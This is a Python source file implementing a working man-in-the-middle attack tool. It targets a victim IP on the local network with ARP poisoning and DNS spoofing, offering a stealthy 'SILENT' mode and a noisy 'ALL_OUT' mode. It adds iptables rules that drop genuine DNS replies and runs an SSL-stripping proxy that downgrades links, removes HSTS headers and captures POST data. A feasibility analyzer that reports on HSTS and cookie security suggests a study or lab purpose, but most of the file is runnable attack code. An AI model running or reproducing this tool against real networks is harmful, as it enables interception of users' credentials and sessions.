from scapy.all import *
import threading
import time
import os
import signal
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.request
import urllib.parse
import ssl
import re
from collections import defaultdict
from datetime import datetime
import argparse
import ipaddress

# CONFIGURATION (ATTACKER MUST SET THESE)
# NOTE: In a fully-fledged tool, these will be overwritten by argparse flags.
CONFIG = {
    # Network Settings
    "ATTACKER_IP": None,
    "INTERFACE": None,
    "VICTIM_IP": None,
    
    # Operational Mode: "SILENT" or "ALL_OUT"
    # SILENT  = Targeted DNS spoofing (SPOOF_MAP only), Slow ARP (Stealthy)
    # ALL_OUT = Spoof ALL DNS requests, Fast ARP (Aggressive/Noisy)
    "MODE": None
}

# DNS Spoofing Map (Used primarily in SILENT mode)
SPOOF_MAP = {
    "www.fakelogin.net.": CONFIG["ATTACKER_IP"],
}

# GLOBAL VARIABLES FOR NETWORK STATE
VICTIM_MAC = None
GATEWAY_IP = None
GATEWAY_MAC = None

STOP_ATTACK = False

# SSL STRIPPING CONFIGURATION
SSL_STRIP_PORT = 8080
ssl_strip_server = None
http_to_https_map = {}


# ANALYSIS DATA STRUCTURES
class SSLStripAnalyzer:
    """Tracks and analyzes SSL stripping feasibility and modern defenses."""
    
    def __init__(self):
        self.http_requests = []  # Track all HTTP requests
        self.https_upgrades = []  # Track HTTP→HTTPS redirects (the "bridge")
        self.hsts_detections = {}  # Track HSTS headers by domain
        self.cookie_analysis = []  # Track cookies and their security attributes
        self.direct_https = []  # Track direct HTTPS attempts (HSTS preload indicator)
        self.stripped_links = defaultdict(int)  # Count HTTPS→HTTP rewrites
        self.attack_effectiveness = {
            'vulnerable_sites': [],  # Sites without HSTS that could be stripped
            'hsts_protected': [],  # Sites protected by HSTS
            'preload_protected': [],  # Sites with HSTS preload (direct HTTPS)
            'secure_cookies': [],  # Sites using Secure cookie attribute
        }
    
    def log_http_request(self, host, path, method):
        """Log HTTP request - potential stripping opportunity."""
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'host': host,
            'path': path,
            'method': method,
            'protocol': 'HTTP'
        }
        self.http_requests.append(entry)
        print(f"[Analyzer] HTTP Request: {method} {host}{path}")
    
    def log_https_upgrade(self, from_url, to_url, status_code):
        """Log HTTP→HTTPS redirect - the critical 'bridge' moment."""
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'from': from_url,
            'to': to_url,
            'status': status_code,
            'type': 'HTTP→HTTPS Bridge'
        }
        self.https_upgrades.append(entry)
        print(f"\n[Analyzer]  CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
        print(f"[Analyzer] From: {from_url}")
        print(f"[Analyzer] To: {to_url}")
        print(f"[Analyzer] Status: {status_code}")
        print(f"[Analyzer] This is the t0 moment - stripping COULD work here\n")
    
    def log_hsts(self, domain, hsts_header):
        """Log HSTS header detection."""
        self.hsts_detections[domain] = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'header': hsts_header,
            'max_age': self._parse_max_age(hsts_header)
        }
        print(f"[Analyzer]  HSTS Detected on {domain}")
        print(f"[Analyzer] Header: {hsts_header}")
        print(f"[Analyzer] Impact: Future requests will skip HTTP entirely\n")
        
        if domain not in self.attack_effectiveness['hsts_protected']:
            self.attack_effectiveness['hsts_protected'].append(domain)
    
    def log_cookie(self, domain, cookie_name, has_secure, has_httponly):
        """Log cookie and analyze security attributes."""
        entry = {
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'domain': domain,
            'name': cookie_name,
            'secure': has_secure,
            'httponly': has_httponly
        }
        self.cookie_analysis.append(entry)
        
        if has_secure:
            print(f"[Analyzer]  Secure Cookie: {cookie_name} on {domain}")
            print(f"[Analyzer] Impact: Cookie will NOT be sent over HTTP (protected)\n")
            if domain not in self.attack_effectiveness['secure_cookies']:
                self.attack_effectiveness['secure_cookies'].append(domain)
        else:
            print(f"[Analyzer]   Insecure Cookie: {cookie_name} on {domain}")
            print(f"[Analyzer] Impact: Cookie WOULD be exposed over HTTP\n")
    
    def log_direct_https(self, host):
        """Log direct HTTPS attempt (likely HSTS preload)."""
        self.direct_https.append({
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'host': host
        })
        print(f"[Analyzer]  Direct HTTPS: {host}")
        print(f"[Analyzer] Likely HSTS Preload - no HTTP 'bridge' exists\n")
        
        if host not in self.attack_effectiveness['preload_protected']:
            self.attack_effectiveness['preload_protected'].append(host)
    
    def log_link_strip(self, url):
        """Track when we strip HTTPS→HTTP in content."""
        self.stripped_links[url] += 1
    
    def _parse_max_age(self, hsts_header):
        """Extract max-age from HSTS header."""
        match = re.search(r'max-age=(\d+)', hsts_header)
        return int(match.group(1)) if match else 0
    
    def generate_report(self):
        """Generate comprehensive analysis report."""
        print("\n" + "="*80)
        print("SSL STRIPPING FEASIBILITY ANALYSIS REPORT")
        print("="*80)
        
        print(f"\n TRAFFIC SUMMARY:")
        print(f"  • Total HTTP requests: {len(self.http_requests)}")
        print(f"  • HTTP→HTTPS upgrades detected: {len(self.https_upgrades)}")
        print(f"  • Direct HTTPS attempts: {len(self.direct_https)}")
        print(f"  • HTTPS links stripped: {sum(self.stripped_links.values())}")
        
        print(f"\n CRITICAL 'BRIDGE' MOMENTS (t0 - where attack could work):")
        if self.https_upgrades:
            for upgrade in self.https_upgrades:
                print(f"  • {upgrade['timestamp']}: {upgrade['from']} → {upgrade['to']}")
                print(f"    Status: {upgrade['status']} (Redirect)")
        else:
            print(f"  • None detected - no stripping opportunities found")
        
        print(f"\n HSTS PROTECTION ANALYSIS:")
        if self.hsts_detections:
            for domain, data in self.hsts_detections.items():
                max_age_days = data['max_age'] / 86400
                print(f"  • {domain}:")
                print(f"    - Max-Age: {max_age_days:.1f} days")
                print(f"    - Effect: Browser will enforce HTTPS for this duration")
        else:
            print(f"  • No HSTS headers detected")
        
        print(f"\n COOKIE SECURITY ANALYSIS:")
        secure_count = sum(1 for c in self.cookie_analysis if c['secure'])
        insecure_count = sum(1 for c in self.cookie_analysis if not c['secure'])
        print(f"  • Secure cookies (protected): {secure_count}")
        print(f"  • Insecure cookies (vulnerable): {insecure_count}")
        
        if insecure_count > 0:
            print(f"\n    Insecure cookies that COULD be stolen via HTTP:")
            for cookie in self.cookie_analysis:
                if not cookie['secure']:
                    print(f"    - {cookie['name']} on {cookie['domain']}")
        
        print(f"\n ATTACK EFFECTIVENESS ASSESSMENT:")
        print(f"  • Vulnerable sites (no HSTS, had HTTP bridge): "
              f"{len([u for u in self.https_upgrades if u['from'].split('/')[2] not in self.hsts_detections])}")
        print(f"  • HSTS-protected sites: {len(self.attack_effectiveness['hsts_protected'])}")
        print(f"  • Preload-protected sites: {len(self.attack_effectiveness['preload_protected'])}")
        print(f"  • Sites using Secure cookies: {len(self.attack_effectiveness['secure_cookies'])}")
        
        print(f"\n KEY FINDINGS:")
        if self.https_upgrades and not self.hsts_detections:
            print(f"  ✓ Attack COULD be effective - HTTP→HTTPS bridge exists without HSTS")
        elif self.https_upgrades and self.hsts_detections:
            print(f"   Attack might work ONCE, but HSTS prevents future attempts")
        elif self.direct_https:
            print(f"  ✗ Attack FAILS - sites using HSTS preload (no HTTP bridge)")
        else:
            print(f"  ? Insufficient data - need more traffic to analyze")
        
        print(f"\n MODERN DEFENSE MECHANISMS OBSERVED:")
        mechanisms = []
        if self.hsts_detections:
            mechanisms.append("HSTS (HTTP Strict Transport Security)")
        if self.attack_effectiveness['preload_protected']:
            mechanisms.append("HSTS Preload Lists")
        if self.attack_effectiveness['secure_cookies']:
            mechanisms.append("Secure Cookie Attribute")
        if self.direct_https:
            mechanisms.append("Browser HTTPS Enforcement")
        
        if mechanisms:
            for mech in mechanisms:
                print(f"  • {mech}")
        else:
            print(f"  • None detected (site may be vulnerable)")
        
        print("\n" + "="*80 + "\n")

# Initialize analyzer
analyzer = SSLStripAnalyzer()
# IPTABLES MANAGEMENT

def manage_iptables(action):
    """
    Adds or deletes the crucial iptables rule to drop the genuine DNS response.
    Action should be 'A' (Add) or 'D' (Delete).
    """

    if action not in ['A', 'D']:
        print("[!] Invalid action for iptables management. Use 'A' to add or 'D' to delete.")
        return
    
    # Rule: Drop packets coming FROM the Gateway (DNS Server) to the Victim on UDP port 53
    iptables_command = (
        f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 "
        f"-d {CONFIG['VICTIM_IP']} -j DROP"
    )
    print(f"[{action}] Executing IPTables command: {iptables_command}")
    os.system(iptables_command)

# ARP FUNCTIONS

def find_gateway():
    """Finds the gateway IP using the system's routing table."""
    # Use random IP outside the network to trace the route to the gateway
    random_IP = "123.123.123.000"
    return conf.route.route(random_IP)[2]

def find_mac(target_IP):
    """Finds the MAC address for a given IP using ARP Request."""
    broadcast = "ff:ff:ff:ff:ff:ff"

    # send ARP request to victim for MAC address
    arp_request = Ether(dst=broadcast)/ARP(pdst=target_IP)
    answered, unanswered = srp(arp_request, timeout=2, verbose=False)
    
    for sent, received in answered:
        if received.psrc == target_IP:
            return received.hwsrc
    return None

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Restores the correct ARP cache on the victim and gateway."""
    # Build a genuine ARP reply for the victim
    victim_restore = Ether(src=gateway_mac, dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac)
    
    # Build a genuine ARP reply for the gateway
    gateway_restore = Ether(src=victim_mac, dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
    
    # Send a few times to ensure the cache is restored
    sendp(victim_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
    sendp(gateway_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
    print("[ARP Poison] ARP tables restored successfully.")

def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Continuously sends forged ARP packets to maintain the poison."""
    
    # Forge ARP packets to victim pretending to be the gateway
    # hwsrc is automatically set to the MAC of the attacker.
    
    # Forge ARP packets to victim pretending to be the gateway
    victim_packet = Ether(dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac)
    # Forge ARP packet to gateway pretending to be the victim. 
    gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)

    # --- IMPLEMENTING OPERATIONAL MODES ---
    # SILENT: Sleep 4s (Harder to detect)
    # ALL_OUT: Sleep 0.5s (Ensures poison sticks, risking detection)
    sleep_interval = 4 if CONFIG["MODE"] == "SILENT" else 0.5

    global STOP_ATTACK
    while not STOP_ATTACK:
        try:
            sendp(victim_packet, iface=CONFIG["INTERFACE"], verbose=False)
            sendp(gateway_packet, iface=CONFIG["INTERFACE"], verbose=False)
            time.sleep(sleep_interval) # Send every couple of seconds to maintain the poison
        except KeyboardInterrupt:
            # If a direct interrupt is caught in this thread, set the flag and break
            STOP_ATTACK = True
            break                                   


# DNS FUNCTIONS

def dns_handler(packet):
    """Handles sniffed DNS packets and attempts to spoof queries."""

    print(f"[DNS Spoof] Received a packet from: {packet[IP].src}")

    if not packet.haslayer(DNS):
        # Ignore non-DNS packets
        print("[DNS Spoof] Packet does not have DNS layer. Ignoring.")
        return
    
    if packet[DNS].qr != 0:
        # Ignore DNS responses
        print(f"[DNS Spoof] Packet is a DNS RESPONSE (qr={packet[DNS].qr}). Ignoring.")
        return

    if not packet.haslayer(DNSQR):
        print("[DNS Spoof] Query packet is missing DNSQR layer. Ignoring.")
        return
    
    print("[DNS Spoof] Packet is a DNS QUERY (qr=0). Proceeding.")

    query_name_bytes = packet[DNSQR].qname

    try:
        query_name = query_name_bytes.decode('utf-8')
    except UnicodeDecodeError:
        print("[DNS Spoof] Could not decode query name.")
        return
        
    print(f"[DNS Spoof] Extracted Query Name: '{query_name}'")

    # --- IMPLEMENTING OPERATIONAL MODES ---
    should_spoof = False
    spoof_ip = None

    if CONFIG["MODE"] == "ALL_OUT":
        # Spoof EVERYTHING 
        # Redirect all traffic to Attacker IP
        if packet[DNSQR].qtype == 1: # 1 = A Record
            should_spoof = True
            spoof_ip = CONFIG["ATTACKER_IP"] # Always redirect to Attacker
            
    elif CONFIG["MODE"] == "SILENT":
        # Only spoof targets explicitly in the map
        if query_name in SPOOF_MAP:
            should_spoof = True
            spoof_ip = SPOOF_MAP[query_name]

    # --- EXECUTE SPOOF ---
    if should_spoof:
        print(f"[DNS Spoof ({CONFIG['MODE']})] Intercepted: {query_name} -> {spoof_ip}; FORGING REPLY...")

        # Crafting the Spoofed Response

        # Forge IP and UDP headers (Source and Destination IPs/Ports swapped)
        spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src) 
        spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) 

        # Create the malicious Answer Record (DNSRR)
        spoofed_answer = DNSRR(rrname=query_name, rdata=spoof_ip)

        # Forge the DNS Response (must use the original TXID)
        spoofed_dns = DNS(id=packet[DNS].id, qr=1, aa=1, rd=0, ra=0, qd=packet[DNSQR], an=spoofed_answer) 
        
        # Packing spoofed layers
        final_packet = spoofed_ip / spoofed_udp / spoofed_dns

        # Send the forged packet
        send(final_packet, verbose=0)
        print(f"[DNS Spoof ({CONFIG['MODE']})] SENT SPOOFED REPLY: {query_name} -> {spoof_ip}")
        
    elif CONFIG["MODE"] == "SILENT":
        # Only print ignored domains in silent mode for debugging
        # In ALL_OUT, we spoof everything so this will be hit only in SILENT mode, when domain is not a target
        print(f"[DNS Spoof ({CONFIG['MODE']})] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring due to Silent Mode.")
        

def stop_sniffing(packet):
    """Callback function for Scapy's sniff to check the global stop flag."""
    global STOP_ATTACK
    # This function returns True when the global flag is set, telling sniff() to exit.
    return STOP_ATTACK

def start_dns_spoofing():
    """Starts the continuous sniffing thread for DNS traffic."""
    
    print(f"[DNS Spoof] Starting DNS sniffer on interface {CONFIG['INTERFACE']}")
    
    # The filter ensures we only catch UDP traffic on port 53 (DNS)
    sniff_thread = threading.Thread(
        target=sniff, 
        kwargs={
            'iface': CONFIG["INTERFACE"], 
            'filter': "udp and port 53", 
            'prn': dns_handler,
            'store': 0, 
            'stop_filter': stop_sniffing
            }
    )
    return sniff_thread

# SSL STRIPPING 
class SSLStripHandler(BaseHTTPRequestHandler):
    """
    HTTP Proxy that demonstrates SSL stripping while analyzing defenses.
    
    Key Concepts Demonstrated:
    1. HTTP→HTTPS "bridge" moment (t0) - where attack could work
    2. HSTS detection - modern defense mechanism
    3. Secure cookie analysis - session protection
    4. HSTS preload effects - no HTTP bridge exists
    """
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass
    
    def do_GET(self):
        """Handle GET requests."""
        self.handle_request('GET')
    
    def do_POST(self):
        """Handle POST requests."""
        self.handle_request('POST')
    
    def do_CONNECT(self):
        """
        Handle CONNECT method - indicates direct HTTPS attempt.
        This shows HSTS preload or user typing https://
        """
        host = self.path.split(':')[0]
        analyzer.log_direct_https(host)
        self.send_error(502, "Direct HTTPS - HSTS Preload likely in effect")
    
    def handle_request(self, method):
        """Core handler with analysis."""
        url = self.path
        host = self.headers.get('Host', '')
        
        # Log the HTTP request
        analyzer.log_http_request(host, url if url.startswith('/') else url, method)
        
        # Construct full URL
        if not url.startswith('http'):
            url = f"http://{host}{url}"
        
        # Check mapping and upgrade to HTTPS for upstream
        target_url = http_to_https_map.get(url, url)
        if not target_url.startswith('https://'):
            target_url = target_url.replace('http://', 'https://', 1)
        
        try:
            # Prepare request
            headers = {}
            for header, value in self.headers.items():
                if header.lower() not in ['host', 'connection', 'proxy-connection']:
                    headers[header] = value
            
            from urllib.parse import urlparse
            parsed = urlparse(target_url)
            headers['Host'] = parsed.netloc
            
            # Handle POST data
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = None
            if method == 'POST' and content_length > 0:
                post_data = self.rfile.read(content_length)
                print(f"[SSL Strip] POST data intercepted ({content_length} bytes)")
            
            # Make HTTPS request upstream
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(target_url, data=post_data, headers=headers)
            
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                response_data = response.read()
                response_headers = response.headers
                status_code = response.getcode()
                
                # Check for redirects (HTTP→HTTPS bridge)
                location = response_headers.get('Location', '')
                if location and location.startswith('https://') and status_code in [301, 302, 303, 307, 308]:
                    analyzer.log_https_upgrade(url, location, status_code)
                
                # Check for HSTS
                if 'strict-transport-security' in response_headers:
                    hsts_value = response_headers['strict-transport-security']
                    analyzer.log_hsts(parsed.netloc, hsts_value)
                
                # Analyze cookies
                set_cookies = response_headers.get_all('Set-Cookie')
                if set_cookies:
                    for cookie_str in set_cookies:
                        cookie_name = cookie_str.split('=')[0]
                        has_secure = 'Secure' in cookie_str or 'secure' in cookie_str
                        has_httponly = 'HttpOnly' in cookie_str or 'httponly' in cookie_str
                        analyzer.log_cookie(parsed.netloc, cookie_name, has_secure, has_httponly)
                
                # Strip HTTPS references from content
                content_type = response_headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    try:
                        response_text = response_data.decode('utf-8', errors='ignore')
                        
                        # Find and strip HTTPS links
                        https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
                        for https_url in https_urls:
                            http_url = https_url.replace('https://', 'http://', 1)
                            http_to_https_map[http_url] = https_url
                            analyzer.log_link_strip(https_url)
                        
                        # Replace https:// with http://
                        modified_text = re.sub(r'https://', 'http://', response_text, flags=re.IGNORECASE)
                        response_data = modified_text.encode('utf-8')
                        
                        if https_urls:
                            print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
                    except Exception as e:
                        print(f"[SSL Strip] Error during rewriting: {e}")
                
                # Send response to victim
                self.send_response(200)
                for header, value in response_headers.items():
                    if header.lower() not in ['transfer-encoding', 'content-encoding', 
                                             'strict-transport-security', 'connection']:
                        self.send_header(header, value)
                
                self.send_header('Content-Length', len(response_data))
                self.end_headers()
                self.wfile.write(response_data)
        
        except Exception as e:
            print(f"[SSL Strip] Error: {e}")
            self.send_error(502, f"Bad Gateway: {str(e)}")

def start_ssl_strip():
    """Start the SSL stripping proxy with analysis."""
    global ssl_strip_server
    
    print(f"[SSL Strip] Starting SSL stripping proxy on port {SSL_STRIP_PORT}")
    print(f"[SSL Strip] Mode: Analysis + Active Stripping")
    print(f"[SSL Strip] Will track HTTP→HTTPS bridges, HSTS, and cookie security\n")
    
    try:
        ssl_strip_server = HTTPServer(('', SSL_STRIP_PORT), SSLStripHandler)
        strip_thread = threading.Thread(target=ssl_strip_server.serve_forever)
        strip_thread.daemon = True
        strip_thread.start()
        return strip_thread
    except Exception as e:
        print(f"[SSL Strip] Failed to start proxy: {e}")
        return None

def setup_ssl_strip_iptables():
    """Configure iptables to redirect only HTTP traffic."""
    redirect_cmd = (
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    print(f"[SSL Strip] Redirecting HTTP (port 80) to proxy")
    os.system(redirect_cmd)

def cleanup_ssl_strip_iptables():
    """Remove SSL stripping iptables rules."""
    remove_cmd = (
        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
    )
    os.system(remove_cmd)

def stop_ssl_strip():
    """Stop the SSL stripping server and generate report."""
    global ssl_strip_server
    
    if ssl_strip_server:
        ssl_strip_server.shutdown()
        ssl_strip_server = None
    
    # Generate comprehensive analysis report
    analyzer.generate_report()


# MAIN EXECUTION AND CLEANUP 

def setup_and_run():
    global CONFIG, SPOOF_MAP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC    
    
    # Set up the argument parser
    if_list = get_if_list()

    parser = argparse.ArgumentParser(prog="Plug-and-play input")
    parser.add_argument("--interface",
                        choices=if_list,
                        default=conf.iface,
                        help="The network interface you want to use.")
    parser.add_argument("--mode", 
                        choices=["SILENT", "ALL_OUT"], 
                        required=True,
                        help="The attack mode. You can choose from silent or all-out.")
    parser.add_argument("--target", 
                        required=True,
                        help="The IP address of your target.")

    args = parser.parse_args()

    # Process --interface
    CONFIG["INTERFACE"] = args.interface
    CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])

    # Process --mode
    CONFIG['MODE'] = args.mode
    if args.mode == "SILENT":
        map_set = False
        while not map_set:
            print("[SETUP] You have selected silent mode. What website do you want to spoof?")
            website = input()
            print(f"[SETUP] Is {website} correct? Y/n")
            answer = input()
            if answer in ["Y", "y", "Yes", "yes"]:
                print(f"[SETUP] Spoofing map set to {website}.")
                SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
                map_set = True
            elif answer in ["N", "n", "No", "no"]:
                continue
            else:
                print("[SETUP] Answer not recognised. Try again.")
    
    # Process --target
    # Check what network the attacker is in
    network = ipaddress.ip_network(f"{CONFIG['ATTACKER_IP']}/24", strict=False)
    GATEWAY_IP = find_gateway()

    # Check if the target IP is in the correct format, in the network, and is not the gateway
    try:
        ip = ipaddress.ip_address(args.target)
        if ip in network and ip != GATEWAY_IP:
            CONFIG['VICTIM_IP'] = ip
        else:
            print("[SETUP] The given IP address is not within this network or is the gateway IP. Exiting.")
            sys.exit(1)
    except ValueError:
        print("[SETUP] The given IP address is not of a valid format. Exiting.")
        sys.exit(1)


    print(f"[SETUP] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG['VICTIM_IP']}")

    # Gather network details
    GATEWAY_MAC = find_mac(GATEWAY_IP)
    VICTIM_MAC = find_mac(CONFIG["VICTIM_IP"])

    if not all([GATEWAY_MAC, VICTIM_MAC]):
        print("[!] ERROR: Could not find MAC addresses for victim or gateway. Exiting.")
        sys.exit(1)

    print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
    print(f"[ARP Poison] The victim at IP address {CONFIG['VICTIM_IP']} is at MAC address {VICTIM_MAC}.")

    # Enable IP Forwarding (Critical for MiTM)
    # The attacker machine needs to forward the packets between gateway and victim.
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding enabled.")

    # Install the DNS Response Dropping Rule
    manage_iptables('A') # Add the DROP rule
    print("[DNS Spoof] DNS response dropping rule installed to win the race.")

    # Start ARP Poisoning thread
    arp_thread = threading.Thread(target=arp_poison_loop, 
        args=(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
    arp_thread.daemon = True
    arp_thread.start()
    print("[ARP Poison] ARP Poisoning started. MiTM position established.")
    
    # Start DNS Spoofing thread
    dns_thread = start_dns_spoofing()
    dns_thread.daemon = True
    dns_thread.start()
    
    # Start SSL Stripping
    setup_ssl_strip_iptables()
    ssl_thread = start_ssl_strip()
    print("[SSL Strip] SSL stripping attack activated.")

    return arp_thread, dns_thread, ssl_thread

def cleanup():
    """Handles graceful shutdown and resource cleanup."""

    global STOP_ATTACK
    
    # Check if cleanup was already initiated
    if STOP_ATTACK:
        return

    print("\n[!] CTRL+C detected. Shutting down...")
    
    STOP_ATTACK = True # Set the flag to stop the threads

    # Wait briefly for sniffing thread to catch the signal and stop
    time.sleep(1)
    
    # Stop SSL stripping
    stop_ssl_strip()
    cleanup_ssl_strip_iptables()
    
    # Restore ARP tables
    if GATEWAY_IP and VICTIM_MAC:
        restore_arp(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
    
    # REMOVE the DNS Response Dropping Rule
    manage_iptables('D') # Delete the DROP rule
    print("[DNS Spoof] DNS response dropping rule removed.")
    
    # Disable IP Forwarding
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding disabled.")

    print("[*] Cleanup complete. Terminating.")

# sudo python3 mitm_spoofer.py
if __name__ == "__main__":

    # Hook the signal handler to the cleanup function, when Ctrl+C is pressed
    signal.signal(signal.SIGINT, lambda s, f: cleanup())

    arp_thread = None
    dns_thread = None
    ssl_thread = None
    
    try:
        # Start the attack sequence
        arp_thread, dns_thread, ssl_thread = setup_and_run()
        
        # Keep the main thread alive until user interruption
        # When cleanup sets STOP_ATTACK, this loop will break
        while not STOP_ATTACK:
            time.sleep(1)
    except KeyboardInterrupt:
        # This catches residual interrupts, but the signal handler should already have initiated cleanup.
        pass
    except SystemExit:
        # This catches the clean exit from the signal handler.
        pass
    except Exception as e:
        print(f"\n[!!!] An unexpected error occurred: {e}")
    finally:
        # The finally block is the ultimate place to ensure cleanup happens
        if not STOP_ATTACK: # Only clean up if the signal handler didn't already
             cleanup()
